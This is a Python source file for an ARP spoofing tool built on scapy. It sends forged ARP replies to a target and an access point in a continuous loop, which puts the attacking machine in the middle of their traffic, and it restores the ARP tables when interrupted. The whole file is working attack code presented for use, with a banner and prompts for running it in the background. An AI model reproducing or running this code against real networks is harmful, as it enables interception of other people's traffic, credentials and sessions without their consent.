#!/usr/bin/env python

import scapy.all as scapy
import subprocess as sb
from termcolor import colored
from logos import Logo
import time
import os

class ARPSpoof:
	def __init__(self, target, AccessPoint):	
		logo = Logo()
		logo.arp_logo()
		print(colored("[!] ", 'yellow') + "Press [S] for split screen!")		
		sent_packets_count = 0
		sb.call(["echo", "1", ">", "/proc/sys/net/ipv4/ip_forward"])
		backgroung = raw_input(colored("[+] ", "magenta") + "Do you want to do ARP Spoof in the background [y/n]? ")
		
		if backgroung == 'y':
			try:
				sb.Popen(["python main.py"], shell=True)
				while True:		
					self.spoof(target, AccessPoint)
					self.spoof(AccessPoint, target)
					sent_packets_count += 2
					time.sleep(2)
			except KeyboardInterrupt:
				print(colored("\n[-] Detected CTRL + C ... Resetting ARP tables ... Please wait.\n", 'red'))
				self.restore(target, AccessPoint)
				self.restore(AccessPoint, target)
		else:
			try:
				while True:		
					self.spoof(target, AccessPoint)
					self.spoof(AccessPoint, target)
					sent_packets_count += 2
					print(colored("\r[+] Packets sent: ", 'magenta') + str(sent_packets_count))
					time.sleep(2)
			except KeyboardInterrupt:
				os.system('clear')
				print(colored("\n[-] Detected CTRL + C ... Resetting ARP tables ... Please wait.\n", 'red'))
				self.restore(target, AccessPoint)
				self.restore(AccessPoint, target)

	def get_mac(self, ip):
		arp_request = scapy.ARP(pdst=ip)
		broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
		arp_request_broadcast = broadcast/arp_request
		answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
		return answered_list[0][1].hwsrc

	def spoof(self, target_ip, spoof_ip):
		target_mac = self.get_mac(target_ip)
		packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
		scapy.send(packet, verbose=False)

	def restore(self, destination_ip, source_ip):
		destination_mac = self.get_mac(destination_ip)
		source_mac = self.get_mac(source_ip)
		packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
		scapy.send(packet, count=4, verbose=False)

